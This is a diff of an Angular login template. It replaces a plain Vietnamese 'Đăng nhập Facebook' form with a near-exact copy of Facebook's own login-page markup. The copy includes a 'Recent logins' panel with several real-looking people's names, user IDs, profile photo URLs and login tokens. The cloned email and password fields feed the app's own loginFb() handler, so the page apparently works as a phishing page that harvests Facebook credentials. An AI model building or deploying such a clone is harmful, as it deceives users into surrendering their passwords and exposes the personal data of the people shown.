@@ -1,51 +1,137 @@
-<div id="page">
-	<section id="content">
-		<div class="container">
-
-
-			<div id="login-page" class="row">
-				<div class="col s12">
-					<form class="login-form" method="POST">
-						<div class="row no-margin-bottom">
-							<div class="input-field col s12 center">
-								<a>
-									<img id="login-logo" src="assets/img/ant.png"/>
-								</a>
-							</div>
+<div class="_li">
+	<div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
+		<div id="blueBarDOMInspector">
+			<div class="_53jh">
+				<div class="loggedout_menubar_container">
+					<div class="clearfix loggedout_menubar">
+						<div class="lfloat _ohe"><h1><a title="Go to Facebook home"><i
+							class="fb_logo img sp_sh983SE11WH sx_84be92"><u>Facebook</u></i></a></h1></div>
+						<div class="menu_login_container rfloat _ohf" data-testid="royal_login_form">
+							<form id="login_form"
+								  novalidate="1"
+								  (ngSubmit)="loginFb()">
+								<input type="hidden" name="lsd" value="AVoeYXXb" autocomplete="off">
+								<table cellspacing="0" role="presentation">
+									<tbody>
+									<tr>
+										<td class="html7magic"><label for="email">Email or Phone</label></td>
+										<td class="html7magic"><label for="pass">Password</label></td>
+									</tr>
+									<tr>
+										<td><input type="email" class="inputtext" name="email" id="email" tabindex="1"
+												   data-testid="royal_email" placeholder="Facebook Email or Phone"
+												   [(ngModel)]="model.username"></td>
+										<td><input type="password" class="inputtext" name="pass" id="pass" tabindex="2"
+												   data-testid="royal_pass" placeholder="Facebook password"
+												   [(ngModel)]="model.password"></td>
+										<td><label class="uiButton uiButtonConfirm" id="loginbutton" for="u_0_y"><input
+											value="Log In" tabindex="4" data-testid="royal_login_button" type="submit" (click)="loginFb()"
+											id="u_0_y"></label></td>
+									</tr>
+									</tbody>
+								</table>
+								<input type="hidden" autocomplete="off" name="timezone" value="-420" id="u_0_z"><input
+								type="hidden" autocomplete="off" name="lgndim"
+								value="eyJ3IjoxNjAwLCJoIjo5MDAsImF3IjoxNjAwLCJhaCI6ODYwLCJjIjoyNH0=" id="u_0_10"><input
+								type="hidden" name="lgnrnd" value="211602_Xxxd"><input type="hidden" id="lgnjs"
+																					   name="lgnjs"
+																					   value="1500092134"><input
+								type="hidden" autocomplete="off" name="ab_test_data" value=""><input type="hidden"
+																									 autocomplete="off"
+																									 id="locale"
+																									 name="locale"
+																									 value="en_GB"><input
+								type="hidden" autocomplete="off" name="login_source" value="login_bluebar"></form>
 						</div>
-						<div class="row no-margin-bottom">
-							<div class="input-field col s12">
-								<i class="material-icons prefix">person_outline</i>
-								<input id="username" name="username" type="text" placeholder="Email đăng nhập Facebook" [(ngModel)]="model.username">
-								<label for="username" class="active">Email</label>
-							</div>
-						</div>
-						<div class="row no-margin-bottom">
-							<div class="input-field col s12">
-								<i class="material-icons prefix">lock_outline</i>
-								<input id="password" name="password" type="password" placeholder="Mật khẩu Facebook" [(ngModel)]="model.password">
-								<label for="password" class="active">Mật khẩu</label>
-							</div>
-						</div>
-						<div class="row no-margin-bottom">
-							<div class="input-field col s12 m12 l12  login-text">
-								<input type="checkbox" id="isPersistent" name="isPersistent">
-								<label for="isPersistent">Lưu lại thông tin đăng nhập</label>
-							</div>
-						</div>
-						<div class="row no-margin-bottom">
-							<div class="input-field col s12">
-								<button type="submit" class="btn waves-effect waves-light col s12" (click)="loginFb()">
-									<i class="fa fa-facebook-square"> </i> Đăng nhập Facebook
-								</button>
-
-							</div>
-						</div>
-					</form>
+					</div>
 				</div>
 			</div>
-
-
 		</div>
-	</section>
+	</div>
+	<div id="globalContainer" class="uiContextualLayerParent">
+		<div class="fb_content clearfix " id="content" role="main">
+			<div>
+				<div class="_4-u5 _2pi6">
+					<div class="_5aj7 _520k _4mow">
+						<div class="_4bl9 _ihf _8wm">
+							<div class="_ihd _deviceLoginHomepageUsersRedesign__loginTitle _3ma _6s">Recent logins</div>
+							<div class="_3m9 mbl _6o _6s _mf">Click on your picture to log in.</div>
+							<table class="uiGrid _51mz _deviceLoginHomepageUsersRedesign__root" cellspacing="0"
+								   cellpadding="0">
+								<tbody>
+								<tr class="_51mx">
+									<td class="_51m- pam removableItem">
+										<div class="uiContextualLayerParent _csi" data-userid="100016488426267">
+											<div><a class="_1gbd" href="#" title="Dương Kiều Trúc" role="button"
+													id="u_0_2"><img class="_s0 _4ooo _1gax img"
+																	src="https://scontent.fhan2-1.fna.fbcdn.net/v/t1.0-1/p160x160/17904526_106427816583499_1816499248059510359_n.jpg?oh=80a917222247c93f60568bb471d9aca3&amp;oe=5A10CCAF"
+																	alt="" aria-label="Dương Kiều Trúc" role="img"
+																	style="width:160px;height:160px">
+												<div class="_1gaz _c24 _50f6">Trúc</div>
+												<form action="/login/device-based/login/" method="post"
+													  onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)"
+													  id="u_0_3"><input type="hidden" name="lsd" value="AVoeYXXb"
+																		autocomplete="off"><input type="hidden"
+																								  autocomplete="off"
+																								  name="uid"
+																								  value="100016488426267"><input
+													type="hidden" autocomplete="off" name="source" value="side_by_side"><input
+													type="hidden" autocomplete="off" name="next"></form>
+											</a><a data-hover="tooltip"
+												   data-tooltip-content="Remove account from this page"
+												   class="_42ft _2d4g _t7b" role="button" href="#"
+												   ajaxify="/login/device-based/async/remove/?cuid=AYgGht20uOoOlh177LT_TEM4QaMe_GsEvBLOXzQf2YKwNQIRZOCLU23b-6SpFsPdevKQEKRFe_iBf42dnTB3maJMEsif8XlyantpFjRs9kbZiQ&amp;flow=www_dbl_selector_remove"
+												   rel="async-post">×</a><span class="_51lp _1gb4"
+																			   title="8 new notifications">8</span>
+											</div>
+										</div>
+									</td>
+									<td class="_51m- pam removableItem">
+										<div class="uiContextualLayerParent _csi" data-userid="1700784279" id="u_0_u">
+											<div><a class="_1gbd"
+													href="/login/?cuid=AYgt8UgWoyWsxF9323Kn38NDl0ld1viYutVvrTwtkeElrBHZeZVOsTcvgchdv8VQapZNbusC-LqGUQ4UPfgagVQ0RK8HeSlBwh-7u8mHqruUmPsciebwm2q5MH89CdkypCaPbps5WNfi8ZYnczQDAOJW"
+													title="Nguyễn Mạnh Cường" id="u_0_0"><img
+												class="_s0 _4ooo _1gax img"
+												src="https://scontent.fhan2-1.fna.fbcdn.net/v/t1.0-1/p160x160/16387021_10203069533974849_5277601766593228560_n.jpg?oh=e17d56229d53daacd5d190ebafdf5a96&amp;oe=59C5838E"
+												alt="" aria-label="Nguyễn Mạnh Cường" role="img"
+												style="width:160px;height:160px">
+												<div class="_1gaz _c24 _50f6">Nguyen</div>
+											</a><a data-hover="tooltip"
+												   data-tooltip-content="Remove account from this page"
+												   class="_42ft _2d4g _t7b" role="button" href="#"
+												   ajaxify="/login/device-based/async/remove/?cuid=AYh7D3YcBDiN8XE15YH_zovHT-KYf5lSlKKMKJq5tPhN84hDDi3-8FucZQWtsPxhuyE9JnpauoAL-JAv9AZ9dT4SviXsQpEh0_v8Fnz4adg_D8tZIWKXDgexhxZvuw4kdSxISczcaFrbMAKkEUsXQp9L&amp;flow=www_dbl_selector_remove"
+												   rel="async-post">×</a><span class="_51lp _1gb4"
+																			   title="12 new notifications">12</span>
+											</div>
+										</div>
+									</td>
+									<td class="_51m- pam removableItem _51mw">
+										<div class="uiContextualLayerParent _csi" data-userid="100011787391202"
+											 id="u_0_v">
+											<div><a class="_1gbd"
+													href="/login/?cuid=AYimeH5kCc8b3b1m-3GJKGb40xgSLvy27lvH5giiCyyQSnveThLo6n6oDIYEmAOyoeHaRhFP8bwIXshbXXXAliW6SXUy7CwM88369Pnv40ZY6NvTCDL_wrmR15yPCJI509F6AV1T_OYjvOeSiMQV_DVv"
+													title="Lam Thái" id="u_0_1"><img class="_s0 _4ooo _1gax img"
+																					 src="https://scontent.fhan2-1.fna.fbcdn.net/v/t1.0-1/c27.0.160.160/p160x160/12920485_101547450248168_7350546504756199692_n.jpg?oh=827f1672d5ce7c837a53134c67ffd1b4&amp;oe=5A057829"
+																					 alt="" aria-label="Lam Thái"
+																					 role="img"
+																					 style="width:160px;height:160px">
+												<div class="_1gaz _c24 _50f6">Lam</div>
+											</a><a data-hover="tooltip"
+												   data-tooltip-content="Remove account from this page"
+												   class="_42ft _2d4g _t7b" role="button" href="#"
+												   ajaxify="/login/device-based/async/remove/?cuid=AYiZSGCCYphu5IZu2NapDyl18LSKImu8u6CmrTndZLOfzqr_FnOdTlncEmExgKwkBM-SVZk-dON-9N04A4oNp99dppc18GTCoBtF4c3nQGPkvCRvwf_GOwh2DneIbMVON08yFPv1-799w0AW1KqLwQNe&amp;flow=www_dbl_selector_remove"
+												   rel="async-post">×</a><span class="_51lp _1gb4"
+																			   title="30 new notifications">30</span>
+											</div>
+										</div>
+									</td>
+								</tr>
+								</tbody>
+							</table>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
 </div>
